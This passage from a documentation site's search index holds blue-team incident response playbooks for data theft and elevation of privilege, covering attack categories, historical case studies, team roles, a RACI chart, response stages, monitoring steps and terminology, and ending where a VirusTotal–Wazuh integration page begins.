and methods.Containment and Eradication: Initiate containment actions to stop more harm if a threat is verified. To eliminate the hazard from the environment, carry out the necessary eradication operations.  Outcome: Efficient examination and reduction of hazards, guaranteeing little influence on the establishment.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#66-post-incident-review","content":" Objective: Analyse the response's efficacy and pinpoint areas that need improvement.  Activities:  Document Findings: Keep a record of all the incident's information, including how it was discovered, what analysis was done, and what steps were made to address it.Review and Improve: Review your monitoring and response procedures after the occurrence to find areas that need improvement and lessons learned.Update Monitoring Tools: Update your monitoring tools, setups, and thresholds considering the results to enhance threat detection and response in the future.Outcome: Constant enhancement of incident response and threat monitoring systems.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#67-continuous-improvement","content":" Objective: Preserve and improve the tools and approach used by the organisation for threat monitoring.  Activities:  Regular Audits: Make sure your tools and monitoring approach are up to date with the latest risks and operating as intended by conducting routine audits.Training and Awareness: To keep your security personnel informed about the newest dangers and best methods for monitoring and responding, provide them regular training.Adapt to New Threats: Make constant adjustments to your monitoring plan to handle emerging dangers. Keep up with the most recent threat intelligence and incorporate it into your processes for monitoring.  Outcome: A proactive, flexible approach to threat monitoring that adjusts to the changing environment.  ","version":"Next","tagName":"h3"},{"title":"7. Terminology​","type":1,"pageTitle":"Data-Theft Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Data Theft Incident Response Playbook#7-terminology","content":" Data Theft: The illicit procurement, duplication, or elimination of private or sensitive information from a company's networks or systems.Insider Threat: A security risk brought on by employees of a company who may, whether on deliberately or accidentally, abuse or divulge sensitive information for nefarious or personal benefit.External Attack: An attempt to steal confidential information through a cyberattack carried out by people or organisations not connected to its internal network, such as hackers, cybercriminals, or nation-state enemies.Incident Response: A methodical strategy for dealing with and handling security events, such as data theft incidents, with the objectives of minimising harm, restarting operations, and averting such occurrences.Indicators of Compromise (IOCs): Observable indicators, such as strange network traffic patterns, unauthorised access attempts, or questionable file alterations, that point to the existence of malicious activity or a security breach.Security Controls: Procedures put in place to guard against security risks, such as instances of data theft, and to safeguard networks, systems, and data. Intrusion detection systems (IDS), encryption, access restrictions, and security awareness training are a few examples of security controls.Forensic Analysis: The methodical inspection of digital evidence connected to a security event, such data theft, to collect and examine data for legal or investigative needs, including figuring out the incident's cause and consequences.Vulnerability: Vulnerabilities or weaknesses in networks, apps, or systems that an attacker may use to get unauthorised access, steal information, or interfere with normal operations. Inadequate security measures, incorrect setups, and software defects can all lead to vulnerabilities.Threat Intelligence: Organisations can predict, detect, and respond to cybersecurity risks with the use of information on current and upcoming threats gathered from a variety of sources.Security Information and Event Management (SIEM): A system that analyses security alarms produced by network hardware and applications in real time. SIEM systems compile and examine activities from many IT infrastructure resources.Intrusion Detection System (IDS): A hardware or software programme that monitors a network or systems for malicious activity or policy breaches.Endpoint Detection and Response (EDR): A security solution that provides real-time monitoring and detection of endpoint threats, enabling rapid response to security incidents.Triage: The process of prioritizing incidents and alerts based on their severity and impact, ensuring that the most critical threats are addressed first.Baseline: A set of data points or metrics that represent normal behavior, used as a reference to identify deviations that could indicate potential security threats. ","version":"Next","tagName":"h2"},{"title":"Elevation of Privilege Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1 Introduction​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#11-overview","content":" In today’s digitally interconnected landscape, organizations face an ever-growing array of cyber threats, with elevation of privilege attacks standing out as particularly insidious. The Elevation of Privilege Incident Response Playbook serves as a vital tool to equip organizations with the means to effectively counter such threats. By offering a structured approach to incident response, this playbook is designed to fortify organizational resilience against security breaches and safeguard critical assets. Through proactive measures and clear response protocols, it empowers security teams to swiftly detect, contain, and remediate incidents, thereby minimizing potential damage and disruption. Moreover, the playbook serves as a proactive strategy to bolster the organization’s overall security posture and readiness in the face of evolving cyber threats.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#12-purpose","content":" The primary purpose of the Elevation of Privilege Incident Response Playbook is to empower organizations to respond swiftly and decisively to elevation of privilege attacks. By providing clear guidelines and procedures, the playbook enables security teams to detect, contain, and remediate incidents in a timely manner, thereby minimizing the potential damage and disruption caused. Additionally, the playbook serves as a proactive measure to enhance the organization’s overall security posture and readiness to combat evolving cyber threats.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#13-attack-definition","content":" An elevation of privilege attack occurs when a malicious actor gains unauthorized access to privileged accounts, systems, or resources within an organization's network. This type of attack typically involves exploiting vulnerabilities in software, misconfigurations, or weaknesses in authentication mechanisms to escalate their level of access beyond what is intended. Examples of elevation of privilege attacks include privilege escalation exploits, credential theft, and lateral movement within the network. By clearly defining these attack vectors, the playbook equips responders with the knowledge to identify and mitigate such threats effectively.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#14-scope","content":" The Elevation of Privilege Incident Response Playbook covers a wide range of elevation of privilege incidents that may occur within the organization's infrastructure. This includes attacks targeting servers, workstations, cloud environments, and other critical assets. The playbook applies to incidents involving both internal and external threats, encompassing malicious activities perpetrated by insiders, external adversaries, or third-party actors. Clarifying the scope ensures that responders understand the playbook's applicability and can effectively execute response procedures within their designated domain of responsibility.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Vertical Privilege Escalation​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#21-vertical-privilege-escalation","content":" In this, an attacker seeks to elevate their privileges within the same system or application. This typically involves escalating from a lower privilege level (e.g., a standard user) to a higher privilege level (e.g., an administrator or root user) on the same system. Attackers often exploit vulnerabilities in the operating system, applications, or configuration settings to gain elevated privileges.  Common techniques for vertical privilege escalation include:  Exploiting Software Vulnerabilities: Attackers exploit vulnerabilities in operating systems, applications, or services to gain unauthorized access to higher privilege levels. This can include buffer overflow attacks, input validation vulnerabilities, or insecure configurations that allow attackers to execute arbitrary code with elevated privileges.Kernel Exploitation: Exploiting vulnerabilities in the operating system kernel to gain root/administrator privileges on the same system. This typically involves exploiting vulnerabilities in kernel-level components such as device drivers or system calls to escalate privileges within the same system.DLL Hijacking (Windows): Exploiting insecure DLL loading mechanisms in Windows applications running on the same system to execute arbitrary code with elevated privileges. This involves planting malicious DLLs in directories searched by vulnerable applications on the same system.File System Manipulation: Manipulating file system permissions, symbolic links, or file attributes within the same system to gain higher privilege levels. This includes modifying file permissions or creating symbolic links to gain unauthorized access to sensitive files or directories within the same system.  Case Study: Microsoft Exchange Server Exploit (2021)  Overview: Attackers exploited vulnerabilities in Microsoft Exchange Server, allowing them to elevate privileges and gain access to email accounts and install additional malware.Impact: Hundreds of thousands of servers were compromised worldwide, affecting both private and public sector organizations.Response: Microsoft released patches to address the vulnerabilities, and organizations were urged to apply these patches immediately and review their systems for signs of compromise.  ","version":"Next","tagName":"h3"},{"title":"2.2 Horizontal Privilege Escalation​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#22-horizontal-privilege-escalation","content":" Horizontal privilege escalation involves gaining access to the same level of privileges but on a different system or application within the same network environment. This is often referred to as an account takeover. Instead of escalating to a higher privilege level, attackers aim to access resources or data that they are not authorized to access within their current privilege level. This type of attack is often associated with lateral movement within a network, where attackers exploit vulnerabilities or weaknesses in interconnected systems to move laterally and gain access to additional resources.  Common techniques for horizontal privilege escalation include:  Exploiting Weak Authentication: Leveraging weak or default credentials or authentication bypass vulnerabilities to gain unauthorized access to accounts or systems on other systems within the same network. For example, using compromised credentials to gain unauthorized access to accounts on other systems.Abusing Misconfigured Permissions: Exploiting misconfigured file system permissions or access control settings to gain unauthorized access to resources or data on other systems within the same network. This involves manipulating file permissions or access control settings to access sensitive resources on other systems.Privilege Escalation via Services: Exploiting vulnerabilities or misconfigurations in network services running on other systems within the same network to gain higher privilege levels. For instance, exploiting vulnerabilities in network services to gain administrative access to other systems.  Understanding the nuances between vertical and horizontal privilege escalation empowers organizations to customize the security defences and response strategies, effectively mitigating the distinct risks posed by each type of attack.  Case Study: SolarWinds Cyberattack (2020)  Overview: Attackers inserted malicious code into the SolarWinds Orion platform, enabling them to move laterally within networks and gain access to sensitive information.Impact: The breach affected numerous organizations, including government agencies and private companies, leading to significant data breaches and security concerns.Response: SolarWinds released updates to secure their platform, and affected organizations conducted thorough investigations and applied security measures to prevent further unauthorized access.  ","version":"Next","tagName":"h3"},{"title":"2.3 Credential Theft​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#23-credential-theft","content":" Attackers steal user credentials such as usernames and passwords, often using techniques like phishing, keylogging, or exploiting weak password policies. These stolen credentials are then used to access systems and escalate privileges.  Common Techniques:  Phishing: Deceptive emails or messages trick users into disclosing their credentials.Keylogging: Malicious software records keystrokes to capture login information.Brute Force Attacks: Automated attempts to guess passwords by trying numerous combinations.  Case Study: Uber Data Breach (2016)  Overview: Attackers used stolen credentials to access Uber's GitHub repository and obtain sensitive data, including personal information of drivers and riders.Impact: Personal information of 57 million drivers and riders was exposed.Response: Uber implemented stronger access controls, enhanced monitoring, and improved security practices to prevent future breaches.  ","version":"Next","tagName":"h3"},{"title":"2.4 Lateral Movement​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#24-lateral-movement","content":" After gaining initial access, attackers move laterally within the network to access additional systems and data. This is often done to maintain persistence and escalate privileges further.  Common Techniques:  Pass-the-Hash: Using hashed credentials to authenticate without knowing the actual password.Exploiting Trust Relationships: Leveraging legitimate network connections to move between systems.Using Exploited Accounts: Compromising additional user accounts to access more resources.  Case Study: NotPetya Ransomware Attack (2017)  Overview: The NotPetya ransomware spread laterally within networks, encrypting data and disrupting operations.Impact: The attack caused extensive damage to various organizations, including Maersk and Merck, leading to billions of dollars in losses.Response: Organizations improved their network segmentation, applied patches, and enhanced their incident response capabilities to mitigate the effects of similar attacks in the future.  ","version":"Next","tagName":"h3"},{"title":"2.5 Insecure API Usage​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#25-insecure-api-usage","content":" Attackers exploit vulnerabilities or misconfigurations in application programming interfaces (APIs) to gain elevated privileges. APIs that are not properly secured can be used to access sensitive data or perform unauthorized actions.  Common Techniques:  Parameter Tampering: Manipulating parameters sent to APIs to bypass authentication or authorization controls.Injection Attacks: Exploiting injection vulnerabilities in API endpoints to execute malicious code.Excessive Data Exposure: Accessing sensitive data that is inadvertently exposed through poorly designed APIs.  Case Study: Facebook API Exploit (2018)  Overview: Attackers exploited vulnerabilities in Facebook's APIs, allowing them to gain access to user accounts and steal personal data.Impact: The breach affected millions of users, exposing their personal information.Response: Facebook patched the vulnerabilities, conducted a thorough security review, and improved their API security practices.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#3-stakeholders","content":" Effective elevation of privilege incident response requires collaboration among key stakeholders within and outside Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader)  Responsibilities:  Identifying, researching, and preventing elevation of privilege attacks.Leading technical response tasks such as privilege escalation analysis and vulnerability patching.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader)  Responsibilities:  Coordinating response efforts and communicating with relevant parties.Implementing incident response protocols and conducting post-incident analysis.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead)  Responsibilities:  Managing internal and external communications regarding the incident.Informing staff, clients, and other relevant parties about the response activities.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#34-customers","content":" Responsibilities:  Reporting suspicious activity.Following organizational guidelines to protect personal information.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors and Partners​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#35-third-party-vendors-and-partners","content":" Responsibilities:  Providing specialized knowledge and assistance during the response process.Complying with data security and privacy requirements.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart for Elevation of Privilege Incident Response​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#raci-chart-for-elevation-of-privilege-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tCustomers\tThird-Party VendorsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tI Develop response procedures\tA, R\tR, C\tI\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI Analysis Collect forensic data\tA, R\tR\tI\tI\tI Identify attack methods\tA, R\tR\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI Containment Isolate compromised systems\tA, R\tR\tI\tI\tI Implement access restrictions\tA, R\tR\tI\tI\tI Block malicious traffic\tA, R\tR\tI\tI\tI Eradication Remove malicious software\tA, R\tR\tI\tI\tI Patch vulnerabilities\tA, R\tR\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI Recovery Restore backups\tA, R\tR\tI\tI\tI Rebuild systems\tA, R\tR\tI\tI\tI Conduct user training\tA, R\tR\tI\tI\tI Post-Incident Review Review incident response\tA, R\tR\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI Update response procedures\tA, R\tR\tI\tI\tI Communication Create communication plans\tC\tC\tA, R\tI\tI Draft communication materials\tC\tC\tA, R\tI\tI Manage media relations\tC\tC\tA, R\tI\tI Provide updates\tC\tC\tA, R\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4 Flow Diagram​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#4-flow-diagram","content":"   Preparation (Pink) Creating an incident response plan that outlines procedures, communication channels, and escalation paths.Train incident response teams and employees.Identifying critical assets and their associated risks.Ensuring that necessary tools and resources are available. Detection (Orange) Implementing intrusion detection systems (IDS) and security monitoring tools - Analysing logs, alerts, and anomalies.Notifying the IRT when suspicious activity is detected. Analysis (Yellow) Gathering information about affected systems, users, and potential attack vectors.Conducting forensics analysis.Assessing the severity and potential consequences. Containment (Green) Blocking malicious traffic or isolating compromised hosts.Changing credentials and access controls.Implementing temporary workarounds. Eradication (Blue) Identifying vulnerabilities or misconfigurations.Patching or updating affected systems.Removing malware or unauthorized accounts. Recovery (Red) Verifying system integrity.Restoring data from backups. Post-Incident Review (Brown) Conduct a thorough review.Learn from the incident.Update the CIRP.  ","version":"Next","tagName":"h2"},{"title":"5 Incident Response Stages​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#51-preparation","content":" Objective: Establish the foundation for an effective elevation of privilege incident response. Activities: Developing and maintaining an incident response plan specifically tailored for elevation of privilege incidents, outlining roles, responsibilities, and escalation procedures.Conducting regular training and awareness programs to educate employees about elevation of privilege risks and response procedures, emphasizing the importance of privilege management.Implementing security controls and measures to prevent, detect, and mitigate elevation of privilege attacks.Reviewing and updating access control policies, privilege management practices, and security configurations to minimize the risk of privilege escalation. Outcome: A fully prepared organization capable of responding quickly and effectively to elevation of privilege incidents.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#52-detection","content":" Objective:Identify indications of elevation of privilege attacks or unauthorized access. Activities: mplementing monitoring and detection mechanisms to identify suspicious activities, anomalies, or indicators of privilege escalation.Utilizing IDS, IPS, EDR solutions, and other security tools to monitor for signs of unauthorized access attempts, privilege escalation exploits, or abnormal behavior.Establishing thresholds and alerting mechanisms to notify incident responders of potential elevation of privilege incidents in real-time.Conducting regular security assessments, vulnerability scans, and penetration tests to identify weaknesses and vulnerabilities that could be exploited for privilege escalation. Outcome: Early identification of elevation of privilege threats enables rapid response.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#53-analysis","content":" Objective: Determine the nature and scope of the elevation of privilege incident. Activities: Collecting and analysing evidence, logs, and artifacts related to the incident.Correlating and contextualizing security events and alerts to reconstruct the attack chain.Assessing the impact of the incident on affected systems, data, and users. Outcome: Comprehensive understanding of the elevation of privilege incident, including causes and effects.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#54-containment","content":" Objective: Stop further unauthorized access or damage caused by the elevation of privilege incident. Activities: Isolating affected systems, networks, or resources to prevent the spread of malware or unauthorized access.Disabling compromised accounts, revoking unnecessary privileges, and resetting compromised credentials.Implementing temporary security controls or mitigations to contain the incident while investigations are ongoing. Outcome: Effective handling of the elevation of privilege incident, minimizing damage.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#55-eradication","content":" Objective: Remove malicious elements and restore system integrity. Activities: Patching or remediating vulnerabilities exploited by attackers to gain unauthorized access or escalate privileges.Removing malware, backdoors, or other malicious artifacts from compromised systems and networks.Conducting thorough security hygiene checks and implementing security best practices to prevent similar incidents in the future. Outcome: Complete removal of elevation of privilege threats and reduction of vulnerabilities.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#56-recovery","content":" Objective: Restore normal operations while maintaining security. Activities Restoring from backups or snapshots to recover data and configurations compromised during the incident.Rebuilding or re-imaging compromised systems to ensure they are free from malware or unauthorized access.Conducting system and network hardening activities to strengthen security posture and minimize the risk of recurrence. Outcome: Full recovery of services with enhanced security measures.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#57-post-incident-review","content":" Objective: Evaluate the effectiveness of the response and identify improvements. Activities: Documenting the incident response process, including timelines, actions taken, and outcomes.Reviewing the effectiveness of response activities and identifying gaps or deficiencies in protocols.Conducting a lesson learned meeting with the incident response team and relevant parties.Updating incident response documentation based on post-event evaluation findings.Sharing insights and recommendations with upper management to strengthen overall security posture. Outcome: Enhanced incident response capabilities and preparedness for future elevation of privilege incidents.  ","version":"Next","tagName":"h3"},{"title":"6. Steps for Monitoring Threats​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#6-steps-for-monitoring-threats","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Establish a Monitoring Strategy​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#61-establish-a-monitoring-strategy","content":" Objective: Establish and implement a comprehensive strategy for continuous threat monitoring specifically targeting elevation of privilege incidents. Activities: Objectives: Clearly define the objectives for threat monitoring, such as detecting unauthorized access attempts, identifying privilege escalation activities, and monitoring unusual network traffic indicative of elevation of privilege incidents.Tools: Select appropriate security tools such as IDS/IPS (Intrusion Detection/Prevention Systems), SIEM (Security Information and Event Management) systems, EDR (Endpoint Detection and Response) solutions, and user behavior analytics software.Baselines: Establish baselines for normal user activity, system behavior, and network traffic patterns to identify deviations that may indicate elevation of privilege activities. Outcome: A well-defined monitoring strategy aligned with Redback Operations' goals, enhancing the ability to detect and respond to elevation of privilege threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Deploy Monitoring Solutions​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#62-deploy-monitoring-solutions","content":" Objective: Deploy and configure monitoring tools across the organization’s infrastructure to detect elevation of privilege threats. Activities: Install and Configure Tools: Deploy the selected monitoring tools across networks, systems, and endpoints. Ensure they are configured to detect elevation of privilege-related activities and collect relevant data.Integrate with Threat Intelligence: Integrate monitoring tools with threat intelligence feeds to enhance the detection of known and emerging elevation of privilege threats.Enable Logging: Ensure logging is enabled on critical systems, networks, and applications. Centralize log collection for efficient analysis and correlation. Outcome: Comprehensive deployment and integration of monitoring solutions providing detailed insights into potential elevation of privilege threats.  ","version":"Next","tagName":"h3"},{"title":"6.3 Continuous Monitoring and Analysis​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#63-continuous-monitoring-and-analysis","content":" Objective: Maintain continuous monitoring and analysis to promptly detect and respond to elevation of privilege threats. Activities: Real-Time Monitoring: Implement real-time monitoring to continuously observe user activities, system behavior, and network traffic, facilitating the immediate detection of elevation of privilege activities.Anomaly Detection: Utilize behavioral analytics and machine learning to identify anomalies and deviations from established baselines that may indicate elevation of privilege activities.Correlate Events: Correlate events from various sources to identify patterns that may indicate coordinated elevation of privilege attacks or persistent threats. Outcome: Enhanced capability to detect elevation of privilege threats promptly, enabling swift response to mitigate potential impacts.  ","version":"Next","tagName":"h3"},{"title":"6.4 Alerting and Notification​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#64-alerting-and-notification","content":" Objective: Ensure timely and effective response to detected threats through a robust alerting system. Activities: Set Alert Thresholds: Establish thresholds for different types of alerts based on severity and potential impact.Automated Alerts: Configure automated alerts to notify the security team of detected elevation of privilege threats. Ensure alerts provide sufficient context for prompt assessment and action.Prioritize Alerts: Implement a system to prioritize alerts based on their severity and potential impact, focusing on the most critical threats first. Outcome: Timely and effective response to detected elevation of privilege threats, reducing the risk of significant damage.  ","version":"Next","tagName":"h3"},{"title":"6.5 Investigate and Respond​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#65-investigate-and-respond","content":" Objective: Conduct thorough investigations and implement appropriate actions to mitigate identified elevation of privilege threats. Activities: Initial Triage: Perform initial triage to verify the validity and potential impact of alerts. Determine the severity of the threat and whether the alert is a false positive.Detailed Analysis: Conduct in-depth analysis of confirmed alerts to understand the nature and extent of the elevation of privilege threat. Use forensic tools and techniques to gather information and trace the source of the threat.Containment and Eradication: Initiate containment measures to prevent further damage if a threat is confirmed. Execute necessary eradication procedures to remove the elevation of privilege threat from the environment. Outcome: Effective investigation and mitigation of elevation of privilege threats, ensuring minimal impact on the organization.  ","version":"Next","tagName":"h3"},{"title":"6.6 Post-Incident Review​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#66-post-incident-review","content":" Objective: Assess the effectiveness of the response and identify areas for improvement. Activities: Document Findings: Record all details of the incident, including detection, analysis, and response actions taken.Review and Improve: Conduct a review of the monitoring and response processes post-incident to identify strengths, weaknesses, and lessons learned.Update Monitoring Tools: Update monitoring tools, configurations, and thresholds based on the findings to enhance future threat detection and response capabilities. Outcome: Continuous improvement of incident response and threat monitoring processes, ensuring better preparedness for future elevation of privilege incidents.  ","version":"Next","tagName":"h3"},{"title":"6.7 Continuous Improvement​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#67-continuous-improvement","content":" Objective: Maintain and enhance the organization’s threat monitoring strategy and tools. Activities: Regular Audits: Conduct regular audits to ensure monitoring tools and strategies remain effective and up to date with the latest threats.Training and Awareness: Provide ongoing training to security personnel on the latest threats and best practices for monitoring and response.Adapt to New Threats: Continuously adapt the monitoring strategy to address emerging threats. Stay informed about the latest threat intelligence and incorporate it into monitoring processes. Outcome: A proactive and adaptive threat monitoring strategy that evolves with the changing threat landscape.  ","version":"Next","tagName":"h3"},{"title":"7 Terminology​","type":1,"pageTitle":"Elevation of Privilege Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Elevation of Privilege Incident Response Playbook#7-terminology","content":" Privilege Escalation: The act of increasing the level of access or permissions granted to a user or application, typically to gain unauthorized control over system resources or sensitive data. Least Privilege Principle: The security principle that users, processes, and systems should be granted only the minimum level of access or permissions necessary to perform their intended tasks, reducing the risk of privilege escalation and unauthorized access. Exploitation: The process of taking advantage of vulnerabilities, misconfigurations, or weaknesses in software, systems, or networks to carry out malicious actions. Security Controls: Measures, mechanisms, or safeguards implemented to protect systems, networks, and data from security threats, such as access controls, authentication mechanisms, encryption, and monitoring solutions. Root Cause Analysis (RCA): A methodical investigation process used to determine the underlying cause or causes of a security incident, to address systemic issues, vulnerabilities, or weaknesses that contributed to the incident. Post-Incident Review: A structured review and analysis of the response to a security incident, including elevation of privilege incidents, to identify lessons learned, areas for improvement, and corrective actions to strengthen incident response capabilities and prevent future incidents. Incident Response Team (IRT): A dedicated team of professionals responsible for responding to security incidents, following the procedures outlined in the incident response plan to mitigate the impact and prevent further damage. Vertical Privilege Escalation: The process of gaining higher levels of access within the same system or application, such as moving from user to administrator. Horizontal Privilege Escalation: The process of gaining access to the same level of privileges but on a different system or application within the same network environment. Credential Theft: The unauthorized acquisition of user credentials, such as usernames and passwords, often used to facilitate further attacks or unauthorized access. Lateral Movement: The process of moving within a network to access additional systems and data after gaining initial access. Insecure API Usage: Exploiting vulnerabilities or misconfigurations in APIs to gain unauthorized access or perform unauthorized actions. ","version":"Next","tagName":"h2"},{"title":"Integrating VirusTotal into Wazuh","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Integrating VirusTotal into 